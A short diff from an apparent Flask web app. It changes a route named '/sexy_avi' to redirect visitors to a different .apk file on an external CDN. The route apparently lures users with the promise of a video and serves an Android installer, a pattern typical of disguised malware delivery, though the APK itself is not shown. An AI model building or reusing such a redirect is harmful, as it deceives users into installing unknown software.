@@ -179,4 +179,4 @@ def recent():
 
 @app.route('/sexy_avi')
 def avi():
-    return redirect('http://ac-9dv47dhd.clouddn.com/dafa5ee7fe1344b2f387.apk', code=302)
+    return redirect('http://ac-9dv47dhd.clouddn.com/dc0ca2b78c9480adc7af.apk', code=302)
